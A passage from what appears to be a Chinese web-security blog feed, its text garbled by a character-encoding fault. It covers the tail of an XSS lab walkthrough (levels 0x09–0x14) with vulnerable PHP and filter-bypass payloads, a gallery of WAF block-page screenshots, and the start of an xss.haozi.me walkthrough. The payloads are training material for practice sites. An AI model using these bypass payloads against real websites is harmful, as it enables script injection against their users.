</code></pre>
<p>æœ¬é¢˜ä¸ç¬¬å…«é¢˜åŸºæœ¬ç›¸ä¼¼,ä½†æ˜¯åŠ å…¥äº†ä¸€ä¸ªé™åˆ¶,ä¼ å…¥çš„å€¼å¿…é¡»åŒ…å«&quot;http://&quot;,ä½†æ˜¯æ²¡æœ‰é™åˆ¶å‡ºç°çš„ä½ç½®,æ‰€ä»¥åªè¦ä¼ å…¥çš„å€¼åŒ…å«å°±è¡Œ</p>
<pre><code class="language-html">payload:
JavaScrip&amp;#x74;:alert(1) // http://
</code></pre>
<br>
<br>
<h2 id="0x09-å—¯-æœç´¢åˆå‡ºç°äº†">0x09 å—¯ æœç´¢åˆå‡ºç°äº†</h2>
<pre><code class="language-php">&lt;?php
ini_set(&quot;display_errors&quot;, 0);
$str = $_GET[&quot;keyword&quot;];
$str11 = $_GET[&quot;t_sort&quot;];
$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);
$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);
echo &quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;.htmlspecialchars($str).&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;.'&lt;center&gt;
&lt;form id=search&gt;
&lt;input name=&quot;t_link&quot;  value=&quot;'.'&quot; type=&quot;hidden&quot;&gt;
&lt;input name=&quot;t_history&quot;  value=&quot;'.'&quot; type=&quot;hidden&quot;&gt;
&lt;input name=&quot;t_sort&quot;  value=&quot;'.$str33.'&quot; type=&quot;hidden&quot;&gt;
&lt;/form&gt;
&lt;/center&gt;';
?&gt;
</code></pre>
<p>æœ¬é¢˜æ²¡æœ‰æ–‡æœ¬æ¡†,çœ‹ä»£ç å‘ç°æ˜¯è¢«è®¾ç½®éšè—äº†,æ‰€ä»¥éœ€è¦å°†å±æ€§è¿›è¡Œé‡å†™è¦†ç›–,å¯¹äº$str11è¿›è¡Œäº†'&lt;' , '&gt;'è¿‡æ»¤,å› æ­¤ä½¿ç”¨JS DOMä»£ç äº‹ä»¶è¿›è¡Œå¼¹çª—</p>
<pre><code class="language-javascript">payload:
t_sort=&quot; type=text onclick=javascript:alert(1) //
</code></pre>
<br>
<br>
<h2 id="0x10-ä¸ºä»€ä¹ˆè¿™ä¹ˆå¤šæœç´¢å‘¢">0x10 ä¸ºä»€ä¹ˆè¿™ä¹ˆå¤šæœç´¢å‘¢</h2>
<pre><code class="language-php">&lt;?php
ini_set(&quot;display_errors&quot;, 0);
$str = $_GET[&quot;keyword&quot;];
$str00 = $_GET[&quot;t_sort&quot;];
$str11=$_SERVER['HTTP_REFERER'];
$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);
$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);
echo &quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;.htmlspecialchars($str).&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;.'&lt;center&gt;
&lt;form id=search&gt;
&lt;input name=&quot;t_link&quot;  value=&quot;'.'&quot; type=&quot;hidden&quot;&gt;
&lt;input name=&quot;t_history&quot;  value=&quot;'.'&quot; type=&quot;hidden&quot;&gt;
&lt;input name=&quot;t_sort&quot;  value=&quot;'.htmlspecialchars($str00).'&quot; type=&quot;hidden&quot;&gt;
&lt;input name=&quot;t_ref&quot;  value=&quot;'.$str33.'&quot; type=&quot;hidden&quot;&gt;
&lt;/form&gt;
&lt;/center&gt;';
?&gt;
</code></pre>
<p>æœ¬é¢˜ä¾æ—§æ²¡æœ‰æ–‡æœ¬æ¡† , ä½†æ˜¯æŸ¥çœ‹ä»£ç æ˜¯å‘ç° , $str11ä¼ å€¼çš„åœ°æ–¹ä¸åœ¨URL , è€Œæ˜¯åœ¨è¯·æ±‚å¤´çš„<a href="https://zh.wikipedia.org/wiki/HTTP%E5%8F%83%E7%85%A7%E4%BD%8D%E5%9D%80">REFERER</a>é‡Œé¢,éœ€è¦ä¼ªé€ REFERERè¿›è¡Œæ”»å‡»</p>
<figure data-type="image" tabindex="1"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-referer.png" alt="" loading="lazy"></figure>
<pre><code class="language-js">payload
t_sort=&quot; type=&quot;text&quot; onclick=javascript:alert(1) //
</code></pre>
<br>
<br>
<h2 id="0x11-é»‘äººé—®å·">0x11 é»‘äººé—®å·</h2>
<pre><code class="language-php">&lt;?php
ini_set(&quot;display_errors&quot;, 0);
$str = $_GET[&quot;keyword&quot;];
$str00 = $_GET[&quot;t_sort&quot;];
$str11=$_SERVER['HTTP_USER_AGENT'];
$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);
$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);
echo &quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;.htmlspecialchars($str).&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;.'&lt;center&gt;
&lt;form id=search&gt;
&lt;input name=&quot;t_link&quot;  value=&quot;'.'&quot; type=&quot;hidden&quot;&gt;
&lt;input name=&quot;t_history&quot;  value=&quot;'.'&quot; type=&quot;hidden&quot;&gt;
&lt;input name=&quot;t_sort&quot;  value=&quot;'.htmlspecialchars($str00).'&quot; type=&quot;hidden&quot;&gt;
&lt;input name=&quot;t_ua&quot;  value=&quot;'.$str33.'&quot; type=&quot;hidden&quot;&gt;
&lt;/form&gt;
&lt;/center&gt;';
?&gt;
</code></pre>
<p>æœ¬é¢˜ä¸ç¬¬åä¸€é¢˜ ç›¸ä¼¼ , ä¸è¿‡æœ¬é¢˜$str11çš„ä¼ å€¼çš„åœ°æ–¹åœ¨è¯·æ±‚å¤´çš„UAé‡Œé¢ , ä¾æ—§éœ€è¦ä¼ªé€ æ”»å‡»,payloadä¾æ—§æ˜¯ç¬¬åä¸€é¢˜çš„payload</p>
<figure data-type="image" tabindex="2"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-user-agent.png" alt="" loading="lazy"></figure>
<pre><code class="language-js">payload
t_sort=&quot; type=&quot;text&quot; onclick=javascript:alert(1) //
</code></pre>
<br>
<br>
<h2 id="0x12-åšé¢˜å¥½çˆ½å•Š">0x12 åšé¢˜å¥½çˆ½å•Š</h2>
<pre><code class="language-php">&lt;?php
setcookie(&quot;user&quot;, &quot;call me maybe?&quot;, time()+3600);
ini_set(&quot;display_errors&quot;, 0);
$str = $_GET[&quot;keyword&quot;];
$str00 = $_GET[&quot;t_sort&quot;];
$str11=$_COOKIE[&quot;user&quot;];
$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);
$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);
echo &quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;.htmlspecialchars($str).&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;.'&lt;center&gt;
&lt;form id=search&gt;
&lt;input name=&quot;t_link&quot;  value=&quot;'.'&quot; type=&quot;hidden&quot;&gt;
&lt;input name=&quot;t_history&quot;  value=&quot;'.'&quot; type=&quot;hidden&quot;&gt;
&lt;input name=&quot;t_sort&quot;  value=&quot;'.htmlspecialchars($str00).'&quot; type=&quot;hidden&quot;&gt;
&lt;input name=&quot;t_cook&quot;  value=&quot;'.$str33.'&quot; type=&quot;hidden&quot;&gt;
&lt;/form&gt;
&lt;/center&gt;';
?&gt;
</code></pre>
<p>ä¸å¤šè¯´,ä¸€æ¡payloadæ‰“ä¸‰é¢˜ğŸ˜…ğŸ˜…,æœ¬é¢˜ä¼ªé€ cookieå³å¯,ä¼ å€¼å˜é‡åè®°å¾—æ”¹ä¸€ä¸‹</p>
<figure data-type="image" tabindex="3"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-cookie.png" alt="" loading="lazy"></figure>
<pre><code class="language-js">user=&quot; type=&quot;text&quot; onclick=javascript:alert(1) //
</code></pre>
<br>
<br>
<h2 id="0x13-æ­å–œä½ å¿«è¦é€šå…³äº†">0x13 æ­å–œä½ å¿«è¦é€šå…³äº†</h2>
<pre><code class="language-php">&lt;?php
ini_set(&quot;display_errors&quot;, 0);
$str = $_GET[&quot;src&quot;];
echo '&lt;body&gt;&lt;span class=&quot;ng-include:'.htmlspecialchars($str).'&quot;&gt;&lt;/span&gt;&lt;/body&gt;';
?&gt;
</code></pre>
<p><strong>é¢˜ç›®æä¾›çš„Angular JSçš„é“¾æ¥å·²ç»å¤±æ•ˆ,éœ€è¦æ›¿æ¢è¿æ¥</strong></p>
<p>è¿™é¢˜è€ƒå¯Ÿ<code>Angular JS</code> çš„<code>ng-include</code>ç”¨æ³•ï¼Œå…·ä½“å¯ä»¥å‚è€ƒè¿™ç¯‡èµ„æ–™ï¼š<a href="http://www.runoob.com/angularjs/ng-ng-include.html">AngularJS ng-include æŒ‡ä»¤</a></p>
<p><strong>ng-include</strong> æŒ‡ä»¤ç”¨äºåŒ…å«å¤–éƒ¨çš„ HTML æ–‡ä»¶ï¼ŒåŒ…å«çš„å†…å®¹å°†ä½œä¸ºæŒ‡å®šå…ƒç´ çš„å­èŠ‚ç‚¹ã€‚<code>ng-include</code> å±æ€§çš„å€¼å¯ä»¥æ˜¯ä¸€ä¸ªè¡¨è¾¾å¼ï¼Œè¿”å›ä¸€ä¸ªæ–‡ä»¶åã€‚é»˜è®¤æƒ…å†µä¸‹ï¼ŒåŒ…å«çš„æ–‡ä»¶éœ€è¦åŒ…å«åœ¨åŒä¸€ä¸ªåŸŸåä¸‹ã€‚æ‰€ä»¥è¿™é‡Œå°±ç”¨æ¥åŒ…å«å…¶ä»–å…³çš„é¡µé¢æ¥è§¦å‘å¼¹çª—ã€‚</p>
<pre><code class="language-js">level14.php?src=&quot;level1.php?name=&lt;img src=x onerror=alert('XSS')&gt;&quot;
</code></pre>
<br>
<br>
<h2 id="0x14-å‰å®³äº†-wordå“¥">0x14 å‰å®³äº† Wordå“¥</h2>
<pre><code class="language-php">&lt;?php
ini_set(&quot;display_errors&quot;, 0);
$str = strtolower($_GET[&quot;keyword&quot;]);
$str2=str_replace(&quot;script&quot;,&quot;&amp;nbsp;&quot;,$str);
$str3=str_replace(&quot; &quot;,&quot;&amp;nbsp;&quot;,$str2);
$str4=str_replace(&quot;/&quot;,&quot;&amp;nbsp;&quot;,$str3);
$str5=str_replace(&quot;    &quot;,&quot;&amp;nbsp;&quot;,$str4);
echo &quot;&lt;center&gt;&quot;.$str5.&quot;&lt;/center&gt;&quot;;
?&gt;
</code></pre>
<p>æœ¬é¢˜ä¸ä»…è¿‡æ»¤äº†script,è¿˜è¿‡æ»¤äº†ç©ºæ ¼,å› æ­¤ä½¿ç”¨å…¶ä»–å…¶ä»–DOMäº‹ä»¶ä¸”ä½¿ç”¨ä¸€ä¸‹åˆ¶ç¬¦æ›¿æ¢ç©ºæ ¼å³å¯</p>
<table>
<thead>
<tr>
<th>åˆ¶ç¬¦</th>
<th>URLç¼–ç </th>
</tr>
</thead>
<tbody>
<tr>
<td>æ¢è¡Œ(LF) : LineFeed</td>
<td>%0A</td>
</tr>
<tr>
<td>å›è½¦(CR) : CreTurn</td>
<td>%0D</td>
</tr>
</tbody>
</table>
<pre><code class="language-js">payload:
&lt;img%0asrc=x%0aonerror=alert(1)&gt;
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[[è½¬è½½] | å¸¸è§WAFæ‹¦æˆªé¡µé¢æ±‡æ€»]]></title>
        <id>https://M0kY4n.github.io/Websec/post/zhuan-zai-or-chang-jian-waf-lan-jie-ye-mian-hui-zong/</id>
        <link href="https://M0kY4n.github.io/Websec/post/zhuan-zai-or-chang-jian-waf-lan-jie-ye-mian-hui-zong/">
        </link>
        <updated>2020-10-18T06:06:28.000Z</updated>
        <content type="html"><![CDATA[<p>#å‰è¨€</p>
<blockquote>
<p>å‰å‡ å¤©åœ¨å¾®ä¿¡å…¬ä¼—å· <font color="#b8dcff">@HACKå­¦ä¹ å‘€</font> çœ‹åˆ°ä¸€ç‰‡æ–‡ç«  <a href="https://mp.weixin.qq.com/s/PWkqNsygi-c_S7tW1y_Hxw">å¹²è´§ | å¸¸è§WAFæ‹¦æˆªé¡µé¢æ€»ç»“</a> , æ–‡ä¸­æåˆ°ä¸€ä½å¤§ä½¬ <font color="#b8dcff">@madcoding</font> çš„ä¸€ç‰‡æ–‡ç«  <a href="https://www.mad-coding.cn/2019/12/19/waf%E7%9A%84%E8%AF%86%E5%88%AB%E4%B8%8E%E7%BB%95%E8%BF%87%EF%BC%88%E4%B8%8D%E6%96%AD%E8%A1%A5%E5%85%85%EF%BC%89/">WAFçš„è¯†åˆ«ä¸ç»•è¿‡</a> ä¸¤ç¯‡æ–‡ç« éƒ½æœ‰ç›¸åŒçš„èµ„æ–™å’Œä¸åŒçš„èµ„æ–™ , ä¸ºäº†ä»¥åæ–¹ä¾¿æŸ¥é˜…,æ‰€ä»¥å°†ä¸¤ç¯‡æ–‡ç« çš„èµ„æ–™è¿›è¡Œæ±‡æ€» . æœ¬æ–‡æ‰€æœ‰èµ„æ–™éƒ½æ˜¯æ ¹æ®ä¸¤ç¯‡æ–‡ç« è¿›è¡Œæ•´åˆ,æ‰€ä»¥è‹¥æœ‰é”™è¯¯çš„åœ°æ–¹,è¯·å¤§ä½¬æŒ‡å‡º!!!</p>
</blockquote>
<br>
<h2 id="1-360ä¸»æœºå«å£«æˆ–360webscan">1.    360ä¸»æœºå«å£«æˆ–360webscan</h2>
<figure data-type="image" tabindex="1"><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/360%E4%B8%BB%E6%9C%BA%E5%8D%AB%E5%A3%AB%E6%88%96360webscan.png?raw=true" alt="360ä¸»æœºå«å£«æˆ–360webscan" loading="lazy"></figure>
<br>
<h2 id="2-360ç½‘ç«™å«å£«">2.   360ç½‘ç«™å«å£«</h2>
<figure data-type="image" tabindex="2"><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/360%E7%BD%91%E7%AB%99%E5%8D%AB%E5%A3%AB.png?raw=true" alt="360ç½‘ç«™å«å£«" loading="lazy"></figure>
<br>
<h2 id="3-dç›¾">3.   Dç›¾</h2>
<figure data-type="image" tabindex="3"><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/D%E7%9B%BE.png?raw=true" alt="Dç›¾" loading="lazy"></figure>
<br>
<h2 id="4-f5-big-ip">4. F5 BIG-IP</h2>
<p><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/F5%20BIG-IP-1.png?raw=true" alt="F5 BIG-IP-1" loading="lazy"><br>
<img src="https://github.com/MokYan/Figurebed/blob/master/WAF/F5%20BIG-IP-2.png?raw=true" alt="F5 BIG-IP-2" loading="lazy"><br>
<img src="https://github.com/MokYan/Figurebed/blob/master/WAF/F5%20BIG-IP-3.png?raw=true" alt="F5 BIG-IP-3" loading="lazy"></p>
<br>
<h2 id="5-mod_securitypng">5.   Mod_Security.png</h2>
<figure data-type="image" tabindex="4"><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/Mod_Security.png?raw=true" alt="Mod_Security.png" loading="lazy"></figure>
<br>
<h2 id="6-naxsi-waf">6.   Naxsi WAF</h2>
<figure data-type="image" tabindex="5"><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/Naxsi%20WAF.png?raw=true" alt="Naxsi WAF" loading="lazy"></figure>
<br>
<h2 id="7-openrasp">7.   OpenRASP</h2>
<figure data-type="image" tabindex="6"><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/OpenRASP.png?raw=true" alt="OpenRASP" loading="lazy"></figure>
<br>
<h2 id="8-upupwå®‰å…¨é˜²æŠ¤">8.   UPUPWå®‰å…¨é˜²æŠ¤</h2>
<figure data-type="image" tabindex="7"><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/UPUPW%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4.png?raw=true" alt="UPUPWå®‰å…¨é˜²æŠ¤" loading="lazy"></figure>
<br>
<h2 id="9-dotdefender">9.   dotDefender</h2>
<figure data-type="image" tabindex="8"><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/dotDefender.png?raw=true" alt="dotDefender" loading="lazy"></figure>
<br>
<h2 id="10-äº‘é”">10.  äº‘é”</h2>
<figure data-type="image" tabindex="9"><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/%E4%BA%91%E9%94%81.png?raw=true" alt="äº‘é”" loading="lazy"></figure>
<br>
<h2 id="11-åˆ›å®‡ç›¾">11.  åˆ›å®‡ç›¾</h2>
<figure data-type="image" tabindex="10"><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/%E5%88%9B%E5%AE%87%E7%9B%BE.png?raw=true" alt="åˆ›å®‡ç›¾" loading="lazy"></figure>
<br>
<h2 id="12-åä¸ºäº‘">12.  åä¸ºäº‘</h2>
<figure data-type="image" tabindex="11"><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/%E5%8D%8E%E4%B8%BA%E4%BA%91.png?raw=true" alt="åä¸ºäº‘" loading="lazy"></figure>
<br>
<h2 id="13-å—äº¬é“±è®¯waf">13.  å—äº¬é“±è®¯waf</h2>
<figure data-type="image" tabindex="12"><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/%E5%8D%97%E4%BA%AC%E9%93%B1%E8%AE%AF%20waf.png?raw=true" alt="å—äº¬é“±è®¯waf" loading="lazy"></figure>
<br>
<h2 id="14-å¥‡å®‰ä¿¡ç½‘ç«™å«å£«">14.  å¥‡å®‰ä¿¡ç½‘ç«™å«å£«</h2>
<figure data-type="image" tabindex="13"><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/%E5%A5%87%E5%AE%89%E4%BF%A1%E7%BD%91%E7%AB%99%E5%8D%AB%E5%A3%AB.png?raw=true" alt="å¥‡å®‰ä¿¡ç½‘ç«™å«å£«" loading="lazy"></figure>
<br>
<h2 id="15-å®‰å…¨ç‹—">15.  å®‰å…¨ç‹—</h2>
<figure data-type="image" tabindex="14"><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/%E5%AE%89%E5%85%A8%E7%8B%97.png?raw=true" alt="å®‰å…¨ç‹—" loading="lazy"></figure>
<br>
<h2 id="16-å®‰åŸŸäº‘waf">16.  å®‰åŸŸäº‘WAF</h2>
<figure data-type="image" tabindex="15"><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/%E5%AE%89%E5%9F%9F%E4%BA%91WAF.png?raw=true" alt="å®‰åŸŸäº‘WAF" loading="lazy"></figure>
<br>
<h2 id="17-å®‰æ’æ˜å¾¡waf">17. å®‰æ’æ˜å¾¡WAF</h2>
<figure data-type="image" tabindex="16"><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/%E5%AE%89%E6%81%92%E6%98%8E%E5%BE%A1WAF.png?raw=true" alt="å®‰æ’æ˜å¾¡WAF" loading="lazy"></figure>
<br>
<h2 id="18-å®å¡”ç½‘ç«™é˜²ç«å¢™">18.  å®å¡”ç½‘ç«™é˜²ç«å¢™</h2>
<figure data-type="image" tabindex="17"><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/%E5%AE%9D%E5%A1%94%E7%BD%91%E7%AB%99%E9%98%B2%E7%81%AB%E5%A2%99.png?raw=true" alt="å®å¡”ç½‘ç«™é˜²ç«å¢™" loading="lazy"></figure>
<br>
<h2 id="19-æŠ¤å«ç¥">19.  æŠ¤å«ç¥</h2>
<figure data-type="image" tabindex="18"><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/%E6%8A%A4%E5%8D%AB%E7%A5%9E.png?raw=true" alt="æŠ¤å«ç¥" loading="lazy"></figure>
<br>
<h2 id="20-æ™ºåˆ›é˜²ç«å¢™">20.  æ™ºåˆ›é˜²ç«å¢™</h2>
<figure data-type="image" tabindex="19"><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/%E6%99%BA%E5%88%9B%E9%98%B2%E7%81%AB%E5%A2%99.png?raw=true" alt="æ™ºåˆ›é˜²ç«å¢™" loading="lazy"></figure>
<br>
<h2 id="21-æœªçŸ¥äº‘waf">21.  æœªçŸ¥äº‘WAF</h2>
<figure data-type="image" tabindex="20"><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/%E6%9C%AA%E7%9F%A5%E4%BA%91WAF.png?raw=true" alt="æœªçŸ¥äº‘WAF" loading="lazy"></figure>
<br>
<h2 id="22-ç„æ­¦ç›¾">22.  ç„æ­¦ç›¾</h2>
<figure data-type="image" tabindex="21"><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/%E7%8E%84%E6%AD%A6%E7%9B%BE.png?raw=true" alt="ç„æ­¦ç›¾" loading="lazy"></figure>
<br>
<h2 id="23-ç™¾åº¦äº‘">23.  ç™¾åº¦äº‘</h2>
<figure data-type="image" tabindex="22"><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/%E7%99%BE%E5%BA%A6%E4%BA%91.png?raw=true" alt="ç™¾åº¦äº‘" loading="lazy"></figure>
<br>
<h2 id="24-ç½‘å®¿äº‘">24.  ç½‘å®¿äº‘</h2>
<p><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/%E7%BD%91%E5%AE%BF%E4%BA%91-2.png?raw=true" alt="ç½‘å®¿äº‘-1" loading="lazy"><br>
<img src="https://github.com/MokYan/Figurebed/blob/master/WAF/%E7%BD%91%E5%AE%BF%E4%BA%91.png?raw=true" alt="ç½‘å®¿äº‘-2" loading="lazy"></p>
<br>
<h2 id="25-ç½‘é˜²g01">25.  ç½‘é˜²G01</h2>
<figure data-type="image" tabindex="23"><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/%E7%BD%91%E9%98%B2G01.png?raw=true" alt="ç½‘é˜²G01" loading="lazy"></figure>
<br>
<h2 id="26-è…¾è®¯äº‘">26.  è…¾è®¯äº‘</h2>
<figure data-type="image" tabindex="24"><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/%E8%85%BE%E8%AE%AF%E4%BA%91.png?raw=true" alt="è…¾è®¯äº‘" loading="lazy"></figure>
<br>
<h2 id="27-è…¾è®¯å®™æ–¯ç›¾">27.  è…¾è®¯å®™æ–¯ç›¾</h2>
<figure data-type="image" tabindex="25"><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/%E8%85%BE%E8%AE%AF%E5%AE%99%E6%96%AF%E7%9B%BE.png?raw=true" alt="è…¾è®¯å®™æ–¯ç›¾" loading="lazy"></figure>
<br>
<h2 id="28-è…¾è®¯é—¨ç¥">28.  è…¾è®¯é—¨ç¥</h2>
<figure data-type="image" tabindex="26"><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/%E8%85%BE%E8%AE%AF%E9%97%A8%E7%A5%9E.png?raw=true" alt="è…¾è®¯é—¨ç¥" loading="lazy"></figure>
<br>
<h2 id="29-è¥¿æ•°wts-waf">29.  è¥¿æ•°WTS-WAF</h2>
<figure data-type="image" tabindex="27"><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/%E8%A5%BF%E6%95%B0WTS-WAF.png?raw=true" alt="è¥¿æ•°WTS-WAF" loading="lazy"></figure>
<br>
<h2 id="30-é“±è®¯waf">30.  é“±è®¯WAF</h2>
<figure data-type="image" tabindex="28"><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/%E9%93%B1%E8%AE%AFWAF.png?raw=true" alt="é“±è®¯WAF" loading="lazy"></figure>
<br>
<h2 id="31-é•¿äº­safeline">31.  é•¿äº­SafeLine</h2>
<figure data-type="image" tabindex="29"><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/%E9%95%BF%E4%BA%ADSafeLine.png?raw=true" alt="é•¿äº­SafeLine" loading="lazy"></figure>
<br>
<h2 id="32-é˜¿é‡Œäº‘ç›¾">32.  é˜¿é‡Œäº‘ç›¾</h2>
<figure data-type="image" tabindex="30"><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/%E9%98%BF%E9%87%8C%E4%BA%91%E7%9B%BE.png?raw=true" alt="é˜¿é‡Œäº‘ç›¾" loading="lazy"></figure>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[XSSå¼¹çª—ç»ƒä¹  : xss.haozi.me]]></title>
        <id>https://M0kY4n.github.io/Websec/post/xsshaozime/</id>
        <link href="https://M0kY4n.github.io/Websec/post/xsshaozime/">
        </link>
        <updated>2020-07-28T12:30:31.000Z</updated>
        <content type="html"><![CDATA[<h1 id="xsså¼¹çª—é—¯å…³ç»ƒä¹ ">XSSå¼¹çª—é—¯å…³ç»ƒä¹ </h1>
<br>
<h2 id="å‰è¨€">å‰è¨€</h2>
<p>è¿™æ˜¯ä¸€ä¸ªxsså¼¹çª—ç»ƒä¹ å¹³å°ï¼Œè®©ä½ ä¸€ä¸ªç‚¹ä¸€ä¸ªç‚¹çš„ç†è§£ XSSã€‚é¡µé¢ä¸Šå±•ç°äº†æºç ï¼Œæ–¹ä¾¿ç›´æ¥ï¼Œæ›´æ˜“ç†è§£å…¶åŸç†ã€‚</p>
<blockquote>
<p>å¹³å°åœ°å€: https://xss.haozi.me/#/</p>
</blockquote>
<p>é¦–æ¬¡è¿›å»éœ€è¦è¾“å…¥ä¸€ä¸ªæ˜µç§°,ä¸”æé†’ä½ <code>è¯·åœ¨ input code æ¡†å†…è¾“å…¥ä»£ç ï¼Œä»¥è‡³å¼¹å‡º alert(1) ä¸ºè¿‡å…³</code></p>
<br>
<h2 id="0x00">0x00</h2>
<pre><code class="language-javascript">æœåŠ¡å™¨ç«¯ä»£ç :
function render (input) {
  return '&lt;div&gt;' + input + '&lt;/div&gt;'
}

å‰ç«¯ä»£ç :
&lt;div&gt;&lt;/div&gt;
</code></pre>
<p>æœåŠ¡å™¨ç«¯æ²¡æœ‰ä»»ä½•è¿‡æ»¤ç›´æ¥æ‰§è¡ŒJavaScriptä»£ç å³å¯</p>
<pre><code class="language-js">payload:
&lt;script&gt;alert(1)&lt;/script&gt;
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-01.png" alt="" loading="lazy"></figure>
<br>
<h2 id="0x01">0x01</h2>
<pre><code class="language-javascript">æœåŠ¡å™¨ç«¯ä»£ç :
function render (input) {
  return '&lt;textarea&gt;' + input + '&lt;/textarea&gt;'
}

å‰ç«¯ä»£ç :
&lt;textarea&gt;&lt;/textarea&gt;
</code></pre>
<p>æœåŠ¡å™¨è™½ç„¶æ²¡æœ‰è¿›è¡Œè¿‡æ»¤,ä½†æ˜¯å‰ç«¯çš„<code>textarea</code>æ ‡ç­¾ä¼šå°†JavaScriptä»£ç æ–‡æœ¬åŒ–ç›´æ¥è¾“å‡ºï¼Œæ‰€ä»¥æ·»åŠ ä¸€ä¸ªç»“æŸæ ‡ç­¾å‡‘æˆä¸€å¯¹å°±èƒ½ç»•è¿‡</p>
<pre><code class="language-javascript">payload:
&lt;/textarea&gt;&lt;script&gt;alert(1)&lt;/script&gt;
</code></pre>
<figure data-type="image" tabindex="2"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-02.png" alt="" loading="lazy"></figure>
<br>
<h2 id="0x02">0x02</h2>
<pre><code class="language-javascript">æœåŠ¡å™¨ç«¯ä»£ç :
function render (input) {
  return '&lt;input type=&quot;name&quot; value=&quot;' + input + '&quot;&gt;'
}

å‰ç«¯ä»£ç :
&lt;input type=&quot;name&quot; value=&quot;&quot;&gt;
</code></pre>
<p>æœåŠ¡å™¨ä¾æ—§æ²¡æœ‰è¿›è¡Œè¿‡æ»¤,ä¸è¿‡è¿™æ¬¡ä»£ç æ’å…¥åœ¨<code>input</code>æ ‡ç­¾ä¸‹çš„<code>value</code>å±æ€§ä¸‹,ä¾æ—§ä¼šå§JavaScriptä»£ç æ–‡æœ¬åŒ–ç›´æ¥è¾“å‡º,å› æ­¤å°†<code>valueçš„åŒå¼•å·</code>å’Œ<code>inputçš„å³å°–æ‹¬å·</code>è¡¥å…¨ å³å¯ç»•è¿‡</p>
<pre><code class="language-javascript">payload:
&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;
</code></pre>
<figure data-type="image" tabindex="3"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-03.png" alt="" loading="lazy"></figure>
<br>
<h2 id="0x03">0x03</h2>
<pre><code class="language-javascript">æœåŠ¡å™¨ç«¯ä»£ç :
function render (input) {
  const stripBracketsRe = /[()]/g
  input = input.replace(stripBracketsRe, '')
  return input
}
</code></pre>
<p>è¿™é¢˜æœåŠ¡å™¨ç»ˆäºå¯¹JavaScriptä»£ç è¿›è¡Œè¿‡æ»¤äº†,ä½¿ç”¨æ˜¯æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…,å¦‚æœåŒ¹é…æˆåŠŸå°±æ›¿æ¢æˆç©º</p>
<ul>
<li>æ­£åˆ™è¡¨è¾¾å¼<code>/[()]/g</code></li>
<li>æœ«å°¾çš„gæ˜¯<code>å…¨å±€åŒ¹é…</code></li>
<li>ä¸¤æ¡æ–œæ æ˜¯ä»£è¡¨<code>å¼€å§‹ä¸ç»“æŸçš„ä½ç½®</code></li>
<li>æ–¹æ‹¬å·æ˜¯è¡¨ç¤ºåŒ¹é…<code>æ–¹æ‹¬å·ä¸­çš„ä»»æ„å­—ç¬¦</code></li>
<li>è¿™ä¸ªæ­£åˆ™è¡¨è¾¾å¼çš„æ„æ€å°±æ˜¯,å…¨å±€åŒ¹é…<code>å·¦æ‹¬å·å’Œæœ‰æ‹¬å·</code></li>
</ul>
<p>æŸ“è¿‡æ–¹æ³•æœ‰å¾ˆå¤š</p>
<pre><code class="language-html">payload:
å¯ç”¨åå¼•å·ä»£æ›¿æ‹¬å·
